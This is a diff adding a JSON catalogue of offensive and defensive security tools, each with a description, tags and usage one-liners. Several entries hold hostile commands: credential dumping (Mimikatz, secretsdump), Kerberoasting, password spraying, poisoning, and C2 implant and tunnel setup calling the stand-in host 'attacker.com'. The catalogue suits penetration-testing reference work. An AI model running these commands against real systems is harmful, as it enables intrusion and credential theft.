@@ -1,0 +1,492 @@
+[
+  {
+    "name": "Nmap",
+    "description": "Network discovery and port scanner with service/version detection and the NSE scripting engine.",
+    "tags": ["recon", "network", "scanner", "linux", "windows", "macos"],
+    "url": "https://nmap.org/",
+    "usage": "nmap -sV -sC -p- 10.0.0.1\nnmap -sU --top-ports 50 10.0.0.1\nnmap --script vuln 10.0.0.1"
+  },
+  {
+    "name": "Masscan",
+    "description": "Asynchronous port scanner designed for very fast internet-scale sweeps.",
+    "tags": ["recon", "network", "scanner", "linux"],
+    "url": "https://github.com/robertdavidgraham/masscan",
+    "usage": "masscan -p1-65535 10.0.0.0/24 --rate 1000"
+  },
+  {
+    "name": "Naabu",
+    "description": "Fast SYN/CONNECT port scanner from ProjectDiscovery with host discovery support.",
+    "tags": ["recon", "network", "scanner", "linux", "macos"],
+    "url": "https://github.com/projectdiscovery/naabu",
+    "usage": "naabu -host target.com -top-ports 1000\nnaabu -list hosts.txt -p - -silent"
+  },
+  {
+    "name": "Amass",
+    "description": "Attack-surface mapping and subdomain enumeration using passive and active sources.",
+    "tags": ["recon", "osint", "dns", "linux", "macos"],
+    "url": "https://github.com/owasp-amass/amass",
+    "usage": "amass enum -d example.com\namass enum -active -d example.com -brute"
+  },
+  {
+    "name": "Subfinder",
+    "description": "Passive subdomain discovery that aggregates data from public sources.",
+    "tags": ["recon", "osint", "dns", "linux", "macos"],
+    "url": "https://github.com/projectdiscovery/subfinder",
+    "usage": "subfinder -d example.com -silent\nsubfinder -dL domains.txt -all -o subs.txt"
+  },
+  {
+    "name": "dnsx",
+    "description": "DNS toolkit for bulk resolution, wildcard filtering, and record queries.",
+    "tags": ["recon", "dns", "linux", "macos"],
+    "url": "https://github.com/projectdiscovery/dnsx",
+    "usage": "subfinder -d example.com -silent | dnsx -a -resp\ncat subs.txt | dnsx -cname -mx"
+  },
+  {
+    "name": "httpx",
+    "description": "HTTP toolkit for probing hosts, collecting titles, status codes, technologies, and screenshots.",
+    "tags": ["recon", "web", "linux", "macos"],
+    "url": "https://github.com/projectdiscovery/httpx",
+    "usage": "cat hosts.txt | httpx -title -status-code -tech-detect\nhttpx -u https://target.com -path /admin -mc 200"
+  },
+  {
+    "name": "Nuclei",
+    "description": "Template-driven vulnerability scanner with a large community template ecosystem.",
+    "tags": ["web", "scanner", "exploitation", "linux", "macos"],
+    "url": "https://github.com/projectdiscovery/nuclei",
+    "usage": "nuclei -u https://target.com -severity critical,high\nnuclei -l urls.txt -tags cve -o findings.txt"
+  },
+  {
+    "name": "ffuf",
+    "description": "Fast web fuzzer for content discovery, parameter fuzzing, and virtual host enumeration.",
+    "tags": ["web", "fuzzing", "recon", "linux", "macos"],
+    "url": "https://github.com/ffuf/ffuf",
+    "usage": "ffuf -u https://target.com/FUZZ -w wordlist.txt\nffuf -u https://target.com -H 'Host: FUZZ.target.com' -w vhosts.txt"
+  },
+  {
+    "name": "feroxbuster",
+    "description": "Recursive content discovery tool written in Rust with filtering and rate limiting.",
+    "tags": ["web", "fuzzing", "recon", "linux", "windows", "macos"],
+    "url": "https://github.com/epi052/feroxbuster",
+    "usage": "feroxbuster -u https://target.com -w wordlist.txt\nferoxbuster -u https://target.com --extensions php,html -d 2"
+  },
+  {
+    "name": "Gobuster",
+    "description": "Enumeration tool for directories, DNS names, virtual hosts, and cloud buckets.",
+    "tags": ["web", "fuzzing", "recon", "linux", "macos"],
+    "url": "https://github.com/OJ/gobuster",
+    "usage": "gobuster dir -u https://target.com -w wordlist.txt\ngobuster dns -d example.com -w subdomains.txt"
+  },
+  {
+    "name": "Katana",
+    "description": "Next-generation web crawler that extracts endpoints, forms, and JavaScript links.",
+    "tags": ["web", "recon", "crawler", "linux", "macos"],
+    "url": "https://github.com/projectdiscovery/katana",
+    "usage": "katana -u https://target.com -jc -d 3\nkatana -list urls.txt -aff -o endpoints.txt"
+  },
+  {
+    "name": "theHarvester",
+    "description": "OSINT collector for emails, hostnames, subdomains, and employee names from public sources.",
+    "tags": ["osint", "recon", "email", "linux", "macos"],
+    "url": "https://github.com/laramies/theHarvester",
+    "usage": "theHarvester -d example.com -b all -l 500"
+  },
+  {
+    "name": "Recon-ng",
+    "description": "Modular reconnaissance framework with workspaces and database-backed modules.",
+    "tags": ["osint", "recon", "framework", "linux", "macos"],
+    "url": "https://github.com/lanmaster53/recon-ng",
+    "usage": "recon-ng\n> workspaces create engagement\n> modules load recon/domains-hosts/hackertarget\n> run"
+  },
+  {
+    "name": "SpiderFoot",
+    "description": "OSINT automation platform that correlates data across hundreds of modules.",
+    "tags": ["osint", "recon", "framework", "linux", "windows", "macos"],
+    "url": "https://github.com/smicallef/spiderfoot",
+    "usage": "spiderfoot -l 127.0.0.1:5001\nspiderfoot -s example.com -t IP_ADDRESS,DOMAIN_NAME -o csv"
+  },
+  {
+    "name": "Sherlock",
+    "description": "Username enumeration across social networks and public sites.",
+    "tags": ["osint", "recon", "linux", "windows", "macos"],
+    "url": "https://github.com/sherlock-project/sherlock",
+    "usage": "sherlock username\nsherlock username --timeout 5 --csv"
+  },
+  {
+    "name": "ExifTool",
+    "description": "Metadata reader and writer for images, documents, and media files.",
+    "tags": ["osint", "forensics", "metadata", "linux", "windows", "macos"],
+    "url": "https://exiftool.org/",
+    "usage": "exiftool image.jpg\nexiftool -a -G1 -s document.pdf"
+  },
+  {
+    "name": "Burp Suite",
+    "description": "Web security testing platform with an intercepting proxy, scanner, and extensible tooling.",
+    "tags": ["web", "proxy", "scanner", "windows", "linux", "macos"],
+    "url": "https://portswigger.net/burp",
+    "usage": "Start the proxy listener on 127.0.0.1:8080, then configure the browser to use it."
+  },
+  {
+    "name": "OWASP ZAP",
+    "description": "Open-source web application proxy and scanner for manual and automated testing.",
+    "tags": ["web", "proxy", "scanner", "linux", "windows", "macos"],
+    "url": "https://www.zaproxy.org/",
+    "usage": "zap.sh -daemon -host 127.0.0.1 -port 8080\nzap-cli quick-scan --self-contained https://target.com"
+  },
+  {
+    "name": "sqlmap",
+    "description": "Automatic SQL injection detection and exploitation tool with database takeover features.",
+    "tags": ["web", "exploitation", "database", "linux", "windows", "macos"],
+    "url": "https://sqlmap.org/",
+    "usage": "sqlmap -u 'https://target.com/item?id=1' --batch\nsqlmap -r request.txt -p id --dbs"
+  },
+  {
+    "name": "Dalfox",
+    "description": "XSS scanner and parameter analysis tool focused on fast, reliable findings.",
+    "tags": ["web", "scanner", "xss", "linux", "macos"],
+    "url": "https://github.com/hahwul/dalfox",
+    "usage": "dalfox url https://target.com/?q=test\ndalfox file urls.txt --blind your.xss.ht"
+  },
+  {
+    "name": "Commix",
+    "description": "Automated command injection exploitation tool for web applications.",
+    "tags": ["web", "exploitation", "linux", "macos"],
+    "url": "https://github.com/commixproject/commix",
+    "usage": "commix -u 'https://target.com/ping?ip=127.0.0.1' --batch"
+  },
+  {
+    "name": "Nikto",
+    "description": "Web server scanner that checks for dangerous files, outdated software, and misconfigurations.",
+    "tags": ["web", "scanner", "linux", "macos"],
+    "url": "https://github.com/sullo/nikto",
+    "usage": "nikto -h https://target.com\nnikto -h target.com -ssl -Tuning 123"
+  },
+  {
+    "name": "WPScan",
+    "description": "WordPress security scanner for plugins, themes, users, and known vulnerabilities.",
+    "tags": ["web", "scanner", "wordpress", "linux", "macos"],
+    "url": "https://wpscan.com/",
+    "usage": "wpscan --url https://target.com --enumerate vp,vt,u\nwpscan --url https://target.com --api-token TOKEN"
+  },
+  {
+    "name": "jwt_tool",
+    "description": "JWT testing toolkit for decoding, tampering, and testing signature weaknesses.",
+    "tags": ["web", "exploitation", "jwt", "linux", "macos"],
+    "url": "https://github.com/ticarpi/jwt_tool",
+    "usage": "python3 jwt_tool.py eyJ... -T\npython3 jwt_tool.py eyJ... -M at -t 'https://target.com/api'"
+  },
+  {
+    "name": "BloodHound",
+    "description": "Active Directory attack-path analysis using graph queries over collected relationship data.",
+    "tags": ["active-directory", "windows", "enumeration", "graph"],
+    "url": "https://github.com/SpecterOps/BloodHound",
+    "usage": "Start BloodHound, import a SharpHound/HoundCE zip, then run built-in queries."
+  },
+  {
+    "name": "SharpHound",
+    "description": "Active Directory data collector that produces BloodHound-compatible relationship data.",
+    "tags": ["active-directory", "windows", "enumeration", "collector"],
+    "url": "https://github.com/SpecterOps/SharpHound",
+    "usage": "SharpHound.exe -c All --zipfilename collection.zip\nSharpHound.exe -c ACL,Trusts,Group"
+  },
+  {
+    "name": "Impacket",
+    "description": "Python toolkit for Windows network protocols, including SMB, WMI, Kerberos, and NTLM attacks.",
+    "tags": ["active-directory", "windows", "linux", "network", "exploitation"],
+    "url": "https://github.com/fortra/impacket",
+    "usage": "impacket-secretsdump domain/user:pass@10.0.0.10\nimpacket-psexec domain/user:pass@10.0.0.10\nimpacket-GetUserSPNs domain/user:pass -dc-ip 10.0.0.10 -request"
+  },
+  {
+    "name": "Rubeus",
+    "description": "C# toolkit for Kerberos interaction, ticket abuse, and credential extraction on Windows.",
+    "tags": ["active-directory", "windows", "kerberos", "credential-access"],
+    "url": "https://github.com/GhostPack/Rubeus",
+    "usage": "Rubeus.exe kerberoast /outfile:hashes.txt\nRubeus.exe asreproast /format:hashcat"
+  },
+  {
+    "name": "Certipy",
+    "description": "Active Directory Certificate Services enumeration and exploitation toolkit.",
+    "tags": ["active-directory", "windows", "linux", "exploitation", "adcs"],
+    "url": "https://github.com/ly4k/Certipy",
+    "usage": "certipy find -u user@domain.local -p pass -dc-ip 10.0.0.10 -vulnerable\ncertipy req -u user@domain.local -p pass -ca CA -template Template"
+  },
+  {
+    "name": "PowerView",
+    "description": "PowerShell reconnaissance module for enumerating Active Directory objects and permissions.",
+    "tags": ["active-directory", "windows", "enumeration", "powershell"],
+    "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",
+    "usage": "Import-Module .\\PowerView.ps1\nGet-DomainUser | select samaccountname,description\nFind-InterestingDomainAcl"
+  },
+  {
+    "name": "Mimikatz",
+    "description": "Windows credential extraction toolkit for LSASS secrets, tickets, and authentication material.",
+    "tags": ["windows", "credential-access", "active-directory", "post-exploitation"],
+    "url": "https://github.com/gentilkiwi/mimikatz",
+    "usage": "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam"
+  },
+  {
+    "name": "NetExec",
+    "description": "Network service exploitation and enumeration framework for SMB, WinRM, LDAP, MSSQL, and more.",
+    "tags": ["active-directory", "windows", "network", "exploitation", "enumeration"],
+    "url": "https://github.com/Pennyw0rth/NetExec",
+    "usage": "nxc smb 10.0.0.0/24 -u user -p pass\nnxc ldap dc.domain.local -u user -p pass --users\nnxc winrm 10.0.0.10 -u user -H NThash"
+  },
+  {
+    "name": "Responder",
+    "description": "LLMNR, NBT-NS, and mDNS poisoner used to capture NetNTLM challenge responses.",
+    "tags": ["active-directory", "windows", "network", "credential-access", "mitm"],
+    "url": "https://github.com/lgandx/Responder",
+    "usage": "responder -I eth0 -wrf\nresponder -I eth0 -A"
+  },
+  {
+    "name": "Kerbrute",
+    "description": "Kerberos pre-authentication brute-force and user enumeration tool.",
+    "tags": ["active-directory", "windows", "linux", "kerberos", "brute-force"],
+    "url": "https://github.com/ropnop/kerbrute",
+    "usage": "kerbrute userenum --dc 10.0.0.10 -d domain.local users.txt\nkerbrute passwordspray --dc 10.0.0.10 -d domain.local users.txt 'Spring2026!'"
+  },
+  {
+    "name": "Metasploit Framework",
+    "description": "Exploitation framework with modules, payloads, encoders, and post-exploitation tooling.",
+    "tags": ["exploitation", "framework", "post-exploitation", "linux", "windows", "macos"],
+    "url": "https://www.metasploit.com/",
+    "usage": "msfconsole\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS 10.0.0.0/24\nrun"
+  },
+  {
+    "name": "Sliver",
+    "description": "Open-source command-and-control framework with implants for multiple platforms.",
+    "tags": ["c2", "post-exploitation", "framework", "linux", "windows", "macos"],
+    "url": "https://github.com/BishopFox/sliver",
+    "usage": "sliver-server\nsliver > generate --mtls attacker.com --os windows\nsliver > mtls --lport 8888"
+  },
+  {
+    "name": "Havoc",
+    "description": "Modern command-and-control framework with a modular agent and teamserver.",
+    "tags": ["c2", "post-exploitation", "framework", "windows", "linux"],
+    "url": "https://github.com/HavocFramework/Havoc",
+    "usage": "Start the teamserver, launch the Havoc client, then create an HTTP listener and generate a Demon agent."
+  },
+  {
+    "name": "BeEF",
+    "description": "Browser exploitation framework for hooking browsers and testing client-side attack surfaces.",
+    "tags": ["web", "exploitation", "browser", "framework", "linux", "macos"],
+    "url": "https://beefproject.com/",
+    "usage": "beef-xss\nOpen the admin UI at http://127.0.0.1:3000/ui/panel"
+  },
+  {
+    "name": "SearchSploit",
+    "description": "Command-line interface to Exploit-DB for locating public exploits and shellcode.",
+    "tags": ["exploitation", "recon", "linux", "macos"],
+    "url": "https://www.exploit-db.com/searchsploit",
+    "usage": "searchsploit apache 2.4\nsearchsploit -m 50383"
+  },
+  {
+    "name": "Chisel",
+    "description": "TCP/UDP tunnel over HTTP with a client-server model for pivoting through restricted networks.",
+    "tags": ["network", "pivoting", "tunnel", "linux", "windows", "macos"],
+    "url": "https://github.com/jpillora/chisel",
+    "usage": "chisel server -p 8080 --reverse\nchisel client attacker.com:8080 R:socks"
+  },
+  {
+    "name": "Ligolo-ng",
+    "description": "Agent-based tunneling and pivoting tool with a TUN interface and per-session routing.",
+    "tags": ["network", "pivoting", "tunnel", "linux", "windows"],
+    "url": "https://github.com/nicocha30/ligolo-ng",
+    "usage": "sudo ip tuntap add user $(whoami) mode tun ligolo\nligolo-proxy -selfcert\nagent -connect attacker.com:11601 -ignore-cert"
+  },
+  {
+    "name": "Bettercap",
+    "description": "Swiss-army knife for network reconnaissance and man-in-the-middle attacks.",
+    "tags": ["network", "mitm", "recon", "wireless", "linux", "macos"],
+    "url": "https://www.bettercap.org/",
+    "usage": "bettercap -iface eth0\nnet.probe on\nnet.sniff on"
+  },
+  {
+    "name": "Wireshark",
+    "description": "Packet capture and protocol analysis GUI with deep dissection support.",
+    "tags": ["network", "forensics", "analysis", "linux", "windows", "macos"],
+    "url": "https://www.wireshark.org/",
+    "usage": "wireshark\nFilter examples: ip.addr == 10.0.0.1 && tcp.port == 80"
+  },
+  {
+    "name": "Hashcat",
+    "description": "GPU-accelerated password recovery tool supporting hundreds of hash and cipher types.",
+    "tags": ["credentials", "password-cracking", "linux", "windows", "macos"],
+    "url": "https://hashcat.net/hashcat/",
+    "usage": "hashcat -m 1000 hashes.txt rockyou.txt\nhashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule"
+  },
+  {
+    "name": "John the Ripper",
+    "description": "Password cracking suite with automatic hash detection and many format-specific modes.",
+    "tags": ["credentials", "password-cracking", "linux", "windows", "macos"],
+    "url": "https://www.openwall.com/john/",
+    "usage": "john --wordlist=rockyou.txt hashes.txt\njohn --format=NT hashes.txt --show"
+  },
+  {
+    "name": "Hydra",
+    "description": "Parallelized login brute-forcer supporting many network protocols and services.",
+    "tags": ["credentials", "brute-force", "network", "linux", "windows", "macos"],
+    "url": "https://github.com/vanhauser-thc/thc-hydra",
+    "usage": "hydra -l admin -P passwords.txt ssh://10.0.0.10\nhydra -L users.txt -P passwords.txt 10.0.0.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
+  },
+  {
+    "name": "Medusa",
+    "description": "Speedy, modular login brute-forcer for a wide range of services.",
+    "tags": ["credentials", "brute-force", "network", "linux", "macos"],
+    "url": "https://github.com/jmk-foofus/medusa",
+    "usage": "medusa -h 10.0.0.10 -u admin -P passwords.txt -M ssh\nmedusa -h 10.0.0.10 -U users.txt -P passwords.txt -M ftp"
+  },
+  {
+    "name": "Volatility 3",
+    "description": "Memory forensics framework for analyzing RAM captures across Windows, Linux, and macOS.",
+    "tags": ["forensics", "incident-response", "memory", "linux", "windows", "macos"],
+    "url": "https://github.com/volatilityfoundation/volatility3",
+    "usage": "vol -f memory.raw windows.pslist\nvol -f memory.raw windows.netscan\nvol -f memory.raw windows.malfind"
+  },
+  {
+    "name": "Autopsy",
+    "description": "Digital forensics platform for disk image analysis, timelines, and artifact extraction.",
+    "tags": ["forensics", "incident-response", "analysis", "windows", "linux"],
+    "url": "https://www.autopsy.com/",
+    "usage": "Create a case, add the disk image as a data source, then run ingest modules."
+  },
+  {
+    "name": "The Sleuth Kit",
+    "description": "Command-line filesystem forensic tools for disk images and file recovery.",
+    "tags": ["forensics", "incident-response", "filesystem", "linux", "macos"],
+    "url": "https://www.sleuthkit.org/",
+    "usage": "mmls disk.img\nfls -r -p -o 2048 disk.img\nicat -o 2048 disk.img 12345 > recovered.bin"
+  },
+  {
+    "name": "Chainsaw",
+    "description": "Rapid Windows event log and forensic artifact hunting with Sigma rule support.",
+    "tags": ["forensics", "incident-response", "windows", "logs", "sigma"],
+    "url": "https://github.com/WithSecureLabs/chainsaw",
+    "usage": "chainsaw hunt evtx/ --sigma sigma/ --mapping mappings/sigma-event-logs-all.yml\nchainsaw dump evtx/Security.evtx"
+  },
+  {
+    "name": "Hayabusa",
+    "description": "Windows event log threat-hunting and timeline generator built on Sigma rules.",
+    "tags": ["forensics", "incident-response", "windows", "logs", "sigma"],
+    "url": "https://github.com/Yamato-Security/hayabusa",
+    "usage": "hayabusa csv-timeline -d evtx/ -o timeline.csv\nhayabusa logon-summary -d evtx/"
+  },
+  {
+    "name": "Velociraptor",
+    "description": "Endpoint visibility and DFIR platform for live hunting, collection, and monitoring at scale.",
+    "tags": ["forensics", "incident-response", "endpoint", "windows", "linux", "macos"],
+    "url": "https://docs.velociraptor.app/",
+    "usage": "velociraptor.exe --config server.config.yaml frontend\nDeploy agents, then run artifact collections from the GUI."
+  },
+  {
+    "name": "Zeek",
+    "description": "Network security monitor that produces structured logs for traffic analysis and hunting.",
+    "tags": ["network", "forensics", "monitoring", "linux", "macos"],
+    "url": "https://zeek.org/",
+    "usage": "zeek -i eth0 local\nzeek-cut id.orig_h id.resp_h method uri < http.log"
+  },
+  {
+    "name": "Ghidra",
+    "description": "NSA-developed software reverse engineering suite with decompiler and scripting support.",
+    "tags": ["malware-analysis", "reverse-engineering", "disassembler", "linux", "windows", "macos"],
+    "url": "https://ghidra-sre.org/",
+    "usage": "Launch Ghidra, create a project, import the binary, and run Auto Analyze."
+  },
+  {
+    "name": "IDA Free",
+    "description": "Free edition of the IDA disassembler and debugger for non-commercial reverse engineering.",
+    "tags": ["malware-analysis", "reverse-engineering", "disassembler", "windows", "linux", "macos"],
+    "url": "https://hex-rays.com/ida-free",
+    "usage": "Open the binary, let auto-analysis finish, then inspect functions and cross-references."
+  },
+  {
+    "name": "radare2",
+    "description": "Command-line reverse engineering framework with disassembly, debugging, and binary patching.",
+    "tags": ["malware-analysis", "reverse-engineering", "disassembler", "linux", "windows", "macos"],
+    "url": "https://rada.re/n/",
+    "usage": "r2 -A binary\n[0x00000000]> afl\n[0x00000000]> pdf @ main"
+  },
+  {
+    "name": "x64dbg",
+    "description": "Open-source Windows debugger for user-mode binaries with scripting and plugin support.",
+    "tags": ["malware-analysis", "reverse-engineering", "debugger", "windows"],
+    "url": "https://x64dbg.com/",
+    "usage": "Open the executable, set breakpoints on API calls, and step through execution."
+  },
+  {
+    "name": "PEStudio",
+    "description": "Static analysis tool for Windows PE files covering imports, resources, strings, and indicators.",
+    "tags": ["malware-analysis", "windows", "static-analysis", "pe"],
+    "url": "https://www.winitor.com/",
+    "usage": "Drag the sample into PEStudio and review the indicators, imports, and strings tabs."
+  },
+  {
+    "name": "capa",
+    "description": "Capability detection tool that maps executable behavior to ATT&CK and malware techniques.",
+    "tags": ["malware-analysis", "reverse-engineering", "detection", "linux", "windows", "macos"],
+    "url": "https://github.com/mandiant/capa",
+    "usage": "capa suspicious.exe\ncapa -v suspicious.exe -j > capabilities.json"
+  },
+  {
+    "name": "FLOSS",
+    "description": "String extraction and deobfuscation tool for malware, including decoded stack strings.",
+    "tags": ["malware-analysis", "strings", "deobfuscation", "linux", "windows", "macos"],
+    "url": "https://github.com/mandiant/flare-floss",
+    "usage": "floss suspicious.exe\nfloss -n 8 suspicious.exe"
+  },
+  {
+    "name": "Pacu",
+    "description": "AWS exploitation framework with modules for enumeration, privilege escalation, and persistence.",
+    "tags": ["cloud", "aws", "exploitation", "linux", "macos"],
+    "url": "https://github.com/RhinoSecurityLabs/pacu",
+    "usage": "pacu\nPacu > import_keys profile\nPacu > run iam__enum_permissions"
+  },
+  {
+    "name": "ScoutSuite",
+    "description": "Multi-cloud security auditing tool that produces an interactive findings report.",
+    "tags": ["cloud", "auditing", "aws", "azure", "gcp", "linux", "macos"],
+    "url": "https://github.com/nccgroup/ScoutSuite",
+    "usage": "scout aws --profile default\nscout azure --cli"
+  },
+  {
+    "name": "Prowler",
+    "description": "Cloud security assessment tool with hundreds of checks across AWS, Azure, GCP, and Kubernetes.",
+    "tags": ["cloud", "auditing", "aws", "azure", "gcp", "kubernetes", "linux", "macos"],
+    "url": "https://github.com/prowler-cloud/prowler",
+    "usage": "prowler aws\nprowler azure --az-cli-auth\nprowler kubernetes --kubeconfig-file config"
+  },
+  {
+    "name": "Trivy",
+    "description": "Scanner for container images, filesystems, repositories, and Kubernetes misconfigurations.",
+    "tags": ["cloud", "containers", "scanner", "kubernetes", "linux", "macos"],
+    "url": "https://trivy.dev/",
+    "usage": "trivy image nginx:latest\ntrivy fs .\ntrivy k8s --report summary cluster"
+  },
+  {
+    "name": "Frida",
+    "description": "Dynamic instrumentation toolkit for injecting scripts into running processes on desktop and mobile.",
+    "tags": ["mobile", "instrumentation", "android", "ios", "linux", "windows", "macos"],
+    "url": "https://frida.re/",
+    "usage": "frida-ps -U\nfrida -U -f com.example.app -l hook.js --no-pause"
+  },
+  {
+    "name": "Objection",
+    "description": "Runtime mobile exploration toolkit built on Frida for Android and iOS assessments.",
+    "tags": ["mobile", "android", "ios", "instrumentation", "linux", "macos"],
+    "url": "https://github.com/sensepost/objection",
+    "usage": "objection -g com.example.app explore\nandroid root disable\nios sslpinning disable"
+  },
+  {
+    "name": "MobSF",
+    "description": "Mobile application security framework for static and dynamic analysis of Android and iOS apps.",
+    "tags": ["mobile", "android", "ios", "scanner", "linux", "macos"],
+    "url": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
+    "usage": "mobsf\nOpen http://127.0.0.1:8000 and upload the APK/IPA."
+  },
+  {
+    "name": "jadx",
+    "description": "Dex-to-Java decompiler with a GUI and CLI for Android application analysis.",
+    "tags": ["mobile", "android", "reverse-engineering", "decompiler", "linux", "windows", "macos"],
+    "url": "https://github.com/skylot/jadx",
+    "usage": "jadx-gui app.apk\njadx -d out app.apk"
+  }
+]
